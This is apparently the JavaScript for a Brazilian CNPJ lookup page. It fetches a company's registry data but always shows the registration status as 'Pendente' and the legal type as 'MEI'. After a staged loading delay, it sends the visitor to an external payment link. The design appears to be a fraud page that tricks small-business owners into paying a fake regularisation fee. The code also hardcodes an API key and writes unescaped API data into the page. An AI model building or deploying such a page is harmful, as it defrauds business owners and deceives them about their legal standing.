// ===== VARIÁVEIS GLOBAIS =====
        let currentStep = 1;
        let cnpjData = null;
        let isProcessing = false;

        // Configurações da API CNPJjá
        const API_BASE_URL = 'https://api.cnpja.com/office'; // Mantido, mas o endpoint correto é 'https://api.cnpja.com/office/{cnpj}'
        const API_KEY = 'c28538f5-9561-4212-b3ee-cfd93e3fe3ec-0f3862d3-3df5-4ff3-8bdc-915072fbe079'; // Chave fornecida pelo usuário

        // ===== UTILITÁRIOS =====
        function debounce(func, delay) {
            let timeoutId;
            return function (...args) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => func.apply(this, args), delay);
            };
        }

        function showSuccessNotification(message) {
            const notification = document.getElementById('successNotification');
            if (notification) {
                notification.textContent = message;
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
            }
        }

        // ===== NAVEGAÇÃO ENTRE ETAPAS =====
        function goToStep(stepNumber) {
            const steps = document.querySelectorAll('.step-content');
            const progressSteps = document.querySelectorAll('.step');
            const progressLineActive = document.getElementById('progressLineActive');

            steps.forEach((step, index) => {
                step.classList.remove('active');
                if (index + 1 === stepNumber) {
                    step.classList.add('active');
                }
            });

            progressSteps.forEach((step, index) => {
                const stepNumber_attr = step.getAttribute('data-step');
                step.classList.remove('active', 'completed');
                
                if (parseInt(stepNumber_attr) === stepNumber) {
                    step.classList.add('active');
                } else if (parseInt(stepNumber_attr) < stepNumber) {
                    step.classList.add('completed');
                }
            });

            const progressWidth = ((stepNumber - 1) / (progressSteps.length - 1)) * 100;
            if (progressLineActive) {
                progressLineActive.style.width = `${progressWidth}%`;
            }

            currentStep = stepNumber;
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        // ===== MÁSCARA DE CNPJ =====
        function applyCNPJMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/, '$1.$2')
                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
                .replace(/\.(\d{3})(\d)/, '.$1/$2')
                .replace(/(\d{4})(\d)/, '$1-$2');
        }

        // ===== BUSCA DE CNPJ =====
        async function handleCNPJLookup() {
            const cnpjInput = document.getElementById('cnpj');
            const cnpj = cnpjInput.value.replace(/\D/g, '');
            const loadingIndicator = document.getElementById('cnpjLoadingIndicator');
            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
            const waitingPayment = document.getElementById('waitingPayment');
            const errorEl = document.getElementById('cnpjError');

            if (cnpj.length !== 14) {
                cnpjInfoDisplay.style.display = 'none';
                waitingPayment.style.display = 'none';
                cnpjInput.classList.remove('success');
                if (errorEl) errorEl.classList.remove('show');
                return;
            }

            if (isProcessing) return;
            isProcessing = true;

            if (loadingIndicator) {
                loadingIndicator.classList.add('show');
            }

            try {
                const url = `${API_BASE_URL}/${cnpj}`; // Corrigido para o endpoint oficial da CNPJá (Receita Federal)
        const headers = {
           'Authorization': API_KEY, // Removido 'Bearer ' conforme documentação da CNPJá            'Content-Type': 'application/json'
        };

        const response = await fetch(url, { headers: headers,
                    signal: AbortSignal.timeout(5000)
                });

                const data = await response.json();

                await new Promise(resolve => setTimeout(resolve, 400));

if (!response.ok || data.error) {
            const errorMessage = data.message || data.error || 'CNPJ não encontrado ou inválido. Verifique a chave de API.';
            throw new Error(errorMessage);
        }

                // A CNPJjá retorna os dados diretamente no corpo da resposta
                cnpjData = data;
                displayCNPJInfo(data, cnpjInput.value);
                cnpjInput.classList.add('success');
                cnpjInput.classList.remove('error');
                if (errorEl) errorEl.classList.remove('show');
                cnpjInfoDisplay.style.display = 'block';
                waitingPayment.style.display = 'block';
                showSuccessNotification('CNPJ encontrado com sucesso!');

                

                

                

                
            } catch (error) {
                console.error('Erro ao buscar CNPJ:', error);
                showCNPJError(error.message || 'Erro ao buscar CNPJ. Verifique se o CNPJ está correto ou tente novamente mais tarde.');
            } finally {
                if (loadingIndicator) {
                    loadingIndicator.classList.remove('show');
                }
                isProcessing = false;
            }
        }

        function displayCNPJInfo(data, formattedCnpj) {
            const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
            const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');

const infoItems = [
{ label: 'CNPJ', value: formattedCnpj || data.cnpj || '-' },
					                { label: 'Situação Cadastral', value: 'Pendente' },
				                // Removido: Data da Situação
				                { label: 'Razão Social', value: data.company?.name || data.name || '-' },
				                // Removido: Nome Fantasia
				                { label: 'Natureza Jurídica', value: 'MEI' },
				                // Removido: Porte
				                { label: 'Data de Abertura', value: data.founded || '-' },
				                { label: 'Atividade Principal', value: data.mainActivity?.description || data.company?.mainActivity?.description || '-' },
				                { label: 'Endereço', value: `${data.address?.street || ''}, ${data.address?.number || ''} ${data.address?.complement || ''} - ${data.address?.district || ''}, ${data.address?.city || ''}/${data.address?.state || ''} - CEP: ${data.address?.zip || ''}`.trim() },
				                { label: 'Telefone', value: data.phones?.[0]?.number || '-' },
				                { label: 'E-mail', value: data.emails?.[0]?.address || '-' }
				            ];

            const htmlContent = infoItems.map(item => `
                <div class="cnpj-info-item">
                    <span class="cnpj-info-label">${item.label}</span>
                    <span class="cnpj-info-value">${item.value}</span>
                </div>
            `).join('');

            if (cnpjInfoGrid) cnpjInfoGrid.innerHTML = htmlContent;
            if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
        }

        function showCNPJError(message) {
            const cnpjInput = document.getElementById('cnpj');
            const errorEl = document.getElementById('cnpjError');
            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
            const waitingPayment = document.getElementById('waitingPayment');

            cnpjInput.classList.add('error');
            cnpjInput.classList.remove('success');
            if (errorEl) {
                errorEl.textContent = message;
                errorEl.classList.add('show');
            }
            cnpjInfoDisplay.style.display = 'none';
            waitingPayment.style.display = 'none';
        }

        // ===== HANDLERS DE FORMULÁRIO =====
        function handleCNPJFormSubmit(e) {
            e.preventDefault();
            // A busca agora é acionada ao preencher o campo ou clicar em Prosseguir
        }

        async function handleConfirmationSubmit(e) {
            e.preventDefault();

            const checkboxes = e.target.querySelectorAll('input[type="checkbox"][required]');
            let allChecked = true;

            checkboxes.forEach(checkbox => {
                if (!checkbox.checked) {
                    allChecked = false;
                    checkbox.style.outline = '2px solid var(--error-color)';
                } else {
                    checkbox.style.outline = 'none';
                }
            });

            if (!allChecked) {
                alert('Por favor, aceite todos os termos para continuar.');
                return;
            }

            const submitBtn = e.target.querySelector('button[type="submit"]');
            const loadingOverlay = document.getElementById('loadingOverlay');

            if (submitBtn) submitBtn.classList.add('btn-loading');
            if (loadingOverlay) loadingOverlay.style.display = 'flex';

            try {
                await new Promise(resolve => setTimeout(resolve, 3000));
                window.location.href = 'https://pay.pag-br.com/r/30HZ97EEkQ4U1E605Z';
            } catch (error) {
                console.error('Erro:', error);
                alert('Erro ao processar solicitação. Tente novamente.');
            } finally {
                if (submitBtn) submitBtn.classList.remove('btn-loading');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
            }
        }

        // ===== INICIALIZAÇÃO =====
        document.addEventListener('DOMContentLoaded', function() {
            // Formulário CNPJ
            const cnpjForm = document.getElementById('cnpjForm');
            if (cnpjForm) {
                cnpjForm.addEventListener('submit', handleCNPJFormSubmit);

                const prosseguirBtn = document.getElementById('btn-prosseguir');
                if (prosseguirBtn) {
                    prosseguirBtn.addEventListener('click', () => {
                        if (cnpjData) { // Verifica se os dados do CNPJ foram carregados
                            goToStep(2);
                        } else {
                            showCNPJError('Por favor, digite um CNPJ válido para a busca antes de prosseguir.');
                        }
                    });
                }
            }

            // Máscara de CNPJ
            const cnpjInput = document.getElementById('cnpj');
            if (cnpjInput) {
                cnpjInput.addEventListener('input', function(e) {
                    const cursorPosition = e.target.selectionStart;
                    const oldValue = e.target.value;
                    const newValue = applyCNPJMask(oldValue);

                    if (newValue !== oldValue) {
                        e.target.value = newValue;
                        const newCursorPosition = cursorPosition + (newValue.length - oldValue.length);
                        e.target.setSelectionRange(newCursorPosition, newCursorPosition);
                    }

                    // Busca automática quando CNPJ está completo
                    if (newValue.replace(/\D/g, '').length === 14) {
                        handleCNPJLookup();
                    }
                });
            }

            // Formulário de Confirmação
            const confirmationForm = document.getElementById('confirmationForm');
            if (confirmationForm) {
                confirmationForm.addEventListener('submit', handleConfirmationSubmit);
            }
        });
